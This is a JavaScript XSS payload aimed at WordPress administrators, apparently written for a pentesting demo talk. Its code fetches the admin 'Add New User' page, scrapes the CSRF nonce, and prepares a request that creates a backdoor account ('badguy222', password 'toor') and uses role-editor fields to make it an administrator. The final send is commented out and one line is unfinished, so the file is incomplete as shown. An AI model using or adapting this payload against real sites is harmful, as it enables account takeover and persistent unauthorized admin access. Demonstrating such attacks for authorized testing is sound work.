/*
	JavaScript functions designed to be used as a XSS payload
	against a WordPress admin. 

	Built for an XSS to shell demo/talk. 

	Only use this code for pentesting systems you're authorized to 
	touch. Or I will be seriously grumpy in your general direction. 


	@hoodoer

	https://github.com/hoodoer
*/


function read_body(xhr) { 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}





function sendAddUserPost(nonce)
{
	var uri       = "/wp-admin/user-new.php";
	var username  = "badguy222";
	var email     = "badguyforrealz@bad.af"
	var firstName = "bobby";
	var lastName  = "phenanana";
	var password  = "toor";

	console.log("Starting addUser...");
	console.log("In addUser, nonce value is: " + nonce);

	xhr = new XMLHttpRequest();
	xhr.open("POST", uri);

	var body = "action=createuser&"
/*
	var formData = new FormData();
	formData.append("action", "createuser");
	formData.append("_wpnonce_create-user", nonce);  // /giphy magic
	formData.append("_wp_http_referer", "%2Fwp-admin%2Fuser-new.php");
	formData.append("user_login", username);
	formData.append("email", email);
	formData.append("first_name", firstName);
	formData.append("last_name", lastName);
	formData.append("uri", "");
	formData.append("pass1", password);
	formData.append("pass1-text", password);
	formData.append("pass2", password);
	formData.append("pw_weak", "on");
	formData.append("send_user_notification", "0");
	formData.append("role", "subscriber");
	formData.append("ure_select_other_roles", "administrator"); // oh yeah baby
	formData.append("ure_other_roles", "administrator"); // Ummph ummph ummph
	formData.append("createuser", "Add New User");

	 xhr.send(formData);
*/


	 console.log("Done adding new user: " + username);
}


// Parse out the nonce value then pass to the add user function
function getAddUserNonce()
{
	console.log("Starting getNonce...");


	var uri = "/wp-admin/user-new.php";

	xhr = new XMLHttpRequest();

	xhr.open("GET", uri, true);
	xhr.send(null);


	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);
			var noncePos = response.indexOf('name="_wpnonce_create-user" value="');
			console.log("Nonce position: " + noncePos);

			var nonceVal = response.substring(noncePos+35, noncePos+45);

			console.log("Inner Nonce value: " + nonceVal);

			sendAddUserPost(nonceVal);
			// "_wpnonce_create-user" value="
			// 537b80b191
		}
	}

}





// This needs 
getAddUserNonce();
//addUser();
